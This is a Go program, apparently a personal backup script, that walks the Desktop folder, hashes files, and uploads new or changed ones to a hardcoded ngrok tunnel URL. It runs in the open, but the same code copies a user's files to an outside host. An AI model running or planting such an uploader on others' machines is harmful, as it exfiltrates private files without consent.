package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const UPLOAD_URL = "https://chug-frostbite-outthink.ngrok-free.dev/upload"

// Backup target directory
var BASE_DIR = filepath.Join(
	os.Getenv("HOME"),
	"Desktop",
)

// Hash database stored inside backup folder
var HASH_FILE = filepath.Join(
	BASE_DIR,
	".filehashes.json",
)

func loadHashes() map[string]string {
	hashes := make(map[string]string)

	data, err := os.ReadFile(HASH_FILE)
	if err != nil {
		return hashes
	}

	json.Unmarshal(data, &hashes)

	return hashes
}

func saveHashes(hashes map[string]string) {
	data, err := json.MarshalIndent(hashes, "", "  ")
	if err != nil {
		fmt.Println("ERROR saving hashes:", err)
		return
	}

	err = os.WriteFile(HASH_FILE, data, 0644)
	if err != nil {
		fmt.Println("ERROR writing hash file:", err)
	}
}

func getFileHash(path string) (string, error) {
	file, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()

	_, err = io.Copy(hash, file)
	if err != nil {
		return "", err
	}

	return hex.EncodeToString(hash.Sum(nil)), nil
}

func uploadFile(filepathAbs string) error {
	file, err := os.Open(filepathAbs)
	if err != nil {
		return err
	}
	defer file.Close()

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	relativePath, _ := filepath.Rel(BASE_DIR, filepathAbs)

	// Add file
	part, err := writer.CreateFormFile(
		"file",
		filepath.Base(filepathAbs),
	)
	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	// Add relative path
	err = writer.WriteField("path", relativePath)
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest(
		"POST",
		UPLOAD_URL,
		&body,
	)
	if err != nil {
		return err
	}

	req.Header.Set(
		"Content-Type",
		writer.FormDataContentType(),
	)

	client := &http.Client{}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)

	fmt.Printf(
		"Upload %s: %d\n",
		relativePath,
		resp.StatusCode,
	)

	fmt.Println(string(respBody))

	return nil
}

// Limited-depth recursive scan
func getFilesLimitedDepth(
	baseDir string,
	maxDepth int,
) ([]string, error) {

	type DirItem struct {
		Path  string
		Depth int
	}

	var results []string

	queue := []DirItem{
		{baseDir, 0},
	}

	for len(queue) > 0 {
		item := queue[0]
		queue = queue[1:]

		entries, err := os.ReadDir(item.Path)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			fullPath := filepath.Join(
				item.Path,
				entry.Name(),
			)

			// Skip hidden directories
			if entry.IsDir() &&
				strings.HasPrefix(entry.Name(), ".") {
				continue
			}

			// Skip symlinks
			info, err := entry.Info()
			if err == nil &&
				info.Mode()&os.ModeSymlink != 0 {
				continue
			}

			if entry.IsDir() {
				if item.Depth < maxDepth {
					queue = append(queue, DirItem{
						fullPath,
						item.Depth + 1,
					})
				}
			} else {
				results = append(results, fullPath)
			}
		}
	}

	return results, nil
}

func main() {
	fmt.Println("Scanning:", BASE_DIR)

	savedHashes := loadHashes()
	currentHashes := make(map[string]string)

	files, err := getFilesLimitedDepth(BASE_DIR, 2)
	if err != nil {
		fmt.Println("ERROR:", err)
		return
	}

	for _, filepathAbs := range files {

		// Skip hash file itself
		if filepathAbs == HASH_FILE {
			continue
		}

		relativePath, _ := filepath.Rel(
			BASE_DIR,
			filepathAbs,
		)

		fileHash, err := getFileHash(filepathAbs)
		if err != nil {
			fmt.Println(
				"ERROR hashing",
				relativePath,
				err,
			)
			continue
		}

		currentHashes[relativePath] = fileHash

		oldHash, exists := savedHashes[relativePath]

		if !exists {
			fmt.Println("[NEW]", relativePath)

			err = uploadFile(filepathAbs)
			if err != nil {
				fmt.Println("UPLOAD ERROR:", err)
			}

		} else if oldHash != fileHash {
			fmt.Println("[MODIFIED]", relativePath)

			err = uploadFile(filepathAbs)
			if err != nil {
				fmt.Println("UPLOAD ERROR:", err)
			}

		} else {
			fmt.Println("[UNCHANGED]", relativePath)
		}
	}

	saveHashes(currentHashes)

	fmt.Println("Done.")
}
